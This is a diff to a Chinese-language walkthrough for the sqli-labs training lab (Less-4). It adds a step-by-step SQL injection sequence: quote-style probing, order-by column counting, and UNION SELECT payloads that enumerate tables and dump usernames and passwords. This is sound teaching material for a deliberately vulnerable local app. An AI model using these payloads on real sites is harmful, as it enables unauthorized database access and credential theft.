@@ -60,8 +60,6 @@
 
 ![Less-1_1](./img/Less-1_1.PNG)
 
-
-
 ![Less-1_2](./img/Less-1_2.PNG)
 
 
@@ -370,4 +368,123 @@ http://localhost/sqli-labs/Less-2/
 
 
 ### Less-4
+
++ 根据下面代码<code>sql</code>注入
+
+~~~ shell
+?id=1") order by 3--+
+?id=-1") union select 1,2,3--+
+?id=-1") union select 1,database(),version()--+
+?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
+?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
+~~~
+
+
+
++ 首先注入以下语句
+
+~~~ shell
+?id=1
+~~~
+
+![Less-4_2](./img/Less-4_2.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1'
+~~~
+
+![Less-4_3](./img/Less-4_3.PNG)
+
+没有变化，说明<code>sql</code>语句不是单引号<code>'</code>字符型
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1"
+~~~
+
+![Less-4_4](./img/Less-4_4.PNG)
+
+根据页面报错信息得知<code>sql</code>语句是双引号字符型且有括号
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1")--+
+~~~
+
+![Less-4_5](./img/Less-4_5.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1") order by 3--+
+~~~
+
+![Less-4_6](./img/Less-4_6.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1") order by 4--+
+~~~
+
+![Less-4_7](./img/Less-4_7.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1") union select 1,version(),database()--+
+~~~
+
+![Less-4_8](./img/Less-4_8.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'--+
+~~~
+
+![Less-4_9](./img/Less-4_9.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'--+
+~~~
+
+![Less-4_10](./img/Less-4_10.PNG)
+
+
+
++ 最后注入以下语句
+
+~~~ shell
+?id=-1") union select 1,2,group_concat(username,id,password) from users--+
+~~~
+
+![Less-4_11](./img/Less-4_11.PNG)
+
+
+
+### Less-5
 
